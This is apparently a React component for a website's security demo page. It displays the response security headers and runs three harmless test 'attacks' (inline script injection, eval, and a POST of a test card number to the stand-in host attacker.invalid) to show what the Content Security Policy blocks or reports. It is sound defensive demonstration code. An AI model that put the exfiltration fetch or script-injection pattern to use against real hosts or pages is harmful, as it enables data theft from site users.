"use client";

import { useCallback, useEffect, useRef, useState } from "react";

const HEADER_NAMES = [
  "content-security-policy",
  "content-security-policy-report-only",
  "strict-transport-security",
  "x-content-type-options",
  "referrer-policy",
  "permissions-policy",
  "x-frame-options",
  "x-powered-by",
];

// .invalid is reserved and never resolves, so even an allowed request goes nowhere.
const EXFIL_URL = "https://attacker.invalid/collect";

type Seen = { directive: string; blocked: string; disposition: string; source: string };

type Attack = {
  id: string;
  label: string;
  what: string;
  run: () => Promise<void> | void;
  matches: (v: Seen) => boolean;
};

const ATTACKS: Attack[] = [
  {
    id: "inline",
    label: "Inject an inline <script>",
    what: "What an XSS bug, or a compromised tag, does first.",
    run: () => {
      const el = document.createElement("script");
      el.textContent = "window.__cspInlineRan = true;";
      document.head.appendChild(el);
      el.remove();
    },
    matches: (v) => v.directive.startsWith("script-src") && v.blocked === "inline",
  },
  {
    id: "eval",
    label: "Turn a string into code with eval()",
    what: "How a loader runs the text it downloaded.",
    run: () => {
      try {
        (0, eval)("1 + 1");
      } catch {
        // EvalError: the policy blocked it. The violation event says so too.
      }
    },
    matches: (v) => v.directive.startsWith("script-src") && v.blocked === "eval",
  },
  {
    id: "exfil",
    label: "Send a card number to attacker.invalid",
    what: "How a malicious script gets data out. Nothing leaves your browser either way.",
    run: async () => {
      await fetch(EXFIL_URL, { method: "POST", mode: "no-cors", body: "card=4111111111111111" }).catch(() => {});
    },
    matches: (v) => v.directive === "connect-src" && v.blocked.startsWith(EXFIL_URL),
  },
];

type Verdict = "blocked" | "reported" | "allowed";

const VERDICT: Record<Verdict, { text: string; className: string }> = {
  blocked: { text: "Blocked", className: "bg-brand/10 text-brand" },
  reported: { text: "Ran, reported only", className: "bg-tertiary/15 text-on-surface" },
  allowed: { text: "Allowed", className: "bg-error/10 text-error" },
};

/**
 * Live check shared by /demo/security and its strict twin. Lists the security
 * headers a fresh request to this URL returns, then runs three harmless "attacks"
 * and reports what this page's CSP did with each.
 *
 * The verdict comes from securitypolicyviolation events, not from whether the code
 * ran: an event's `disposition` says whether the policy blocked ("enforce") or only
 * reported ("report"), which is how the report-only rollout shows up honestly.
 */
export default function SecurityCheck() {
  const [headers, setHeaders] = useState<[string, string | null][] | null>(null);
  const [verdicts, setVerdicts] = useState<Record<string, Verdict>>({});
  const [seen, setSeen] = useState<Seen[]>([]);
  const [running, setRunning] = useState(false);
  const seenRef = useRef<Seen[]>([]);

  useEffect(() => {
    const onViolation = (e: SecurityPolicyViolationEvent) => {
      const v: Seen = {
        directive: e.effectiveDirective,
        blocked: e.blockedURI,
        disposition: e.disposition,
        source: e.sourceFile,
      };
      seenRef.current = [...seenRef.current, v];
      setSeen(seenRef.current.slice(-20));
    };
    document.addEventListener("securitypolicyviolation", onViolation);

    fetch(window.location.pathname, { method: "HEAD", cache: "no-store" })
      .then((res) => setHeaders(HEADER_NAMES.map((name) => [name, res.headers.get(name)])))
      .catch(() => setHeaders([]));

    return () => document.removeEventListener("securitypolicyviolation", onViolation);
  }, []);

  const runAttacks = useCallback(async () => {
    setRunning(true);
    const before = seenRef.current.length;
    for (const attack of ATTACKS) await attack.run();
    // Violation events are queued as tasks, so give them a moment to arrive.
    await new Promise((resolve) => setTimeout(resolve, 600));
    const fresh = seenRef.current.slice(before);
    const next: Record<string, Verdict> = {};
    for (const attack of ATTACKS) {
      const hit = fresh.find(attack.matches);
      next[attack.id] = !hit ? "allowed" : hit.disposition === "enforce" ? "blocked" : "reported";
    }
    setVerdicts(next);
    setRunning(false);
  }, []);

  return (
    <div data-component="SecurityCheck" className="space-y-8">
      <div>
        <h3 className="font-display text-lg font-bold text-on-surface mb-3">Headers on a fresh request to this URL</h3>
        {headers === null ? (
          <p className="text-sm text-on-surface-variant">Loading...</p>
        ) : (
          <dl className="divide-y divide-ghost-border rounded-xl border border-ghost-border overflow-hidden">
            {headers.map(([name, value]) => (
              <div key={name} className="grid md:grid-cols-[18rem_1fr] gap-1 px-4 py-2 bg-surface-lowest">
                <dt className="font-mono text-xs text-on-surface">{name}</dt>
                <dd className={`font-mono text-xs break-all ${value ? "text-on-surface-variant" : "text-on-surface-variant/50"}`}>
                  {value ?? "(not sent)"}
                </dd>
              </div>
            ))}
          </dl>
        )}
      </div>

      <div>
        <div className="flex items-center gap-4 mb-3">
          <h3 className="font-display text-lg font-bold text-on-surface">Three harmless attacks</h3>
          <button
            type="button"
            onClick={runAttacks}
            disabled={running}
            className="ml-auto rounded-control bg-brand px-4 py-2 text-sm font-semibold text-on-brand disabled:opacity-50"
          >
            {running ? "Running..." : "Run them"}
          </button>
        </div>
        <ul className="divide-y divide-ghost-border rounded-xl border border-ghost-border overflow-hidden">
          {ATTACKS.map((attack) => {
            const verdict = verdicts[attack.id];
            return (
              <li key={attack.id} className="flex items-start gap-4 px-4 py-3 bg-surface-lowest">
                <div className="flex-1">
                  <p className="text-sm font-semibold text-on-surface">{attack.label}</p>
                  <p className="text-xs text-on-surface-variant">{attack.what}</p>
                </div>
                {verdict && (
                  <span className={`shrink-0 rounded-full px-2.5 py-0.5 text-xs font-semibold ${VERDICT[verdict].className}`}>
                    {VERDICT[verdict].text}
                  </span>
                )}
              </li>
            );
          })}
        </ul>
      </div>

      <div>
        <h3 className="font-display text-lg font-bold text-on-surface mb-1">Violations on this page so far</h3>
        <p className="text-xs text-on-surface-variant mb-3">
          Every report this page has raised since it loaded, third-party scripts included. These are the lines
          that also reach /api/csp-report.
        </p>
        {seen.length === 0 ? (
          <p className="text-sm text-on-surface-variant">None yet.</p>
        ) : (
          <ul className="space-y-1 font-mono text-xs text-on-surface-variant">
            {seen.map((v, i) => (
              <li key={i} className="break-all">
                <span className="text-on-surface">{v.disposition}</span> {v.directive} blocked={v.blocked || "?"}
                {v.source ? ` source=${v.source.split(/[?#]/)[0]}` : ""}
              </li>
            ))}
          </ul>
        )}
      </div>
    </div>
  );
}
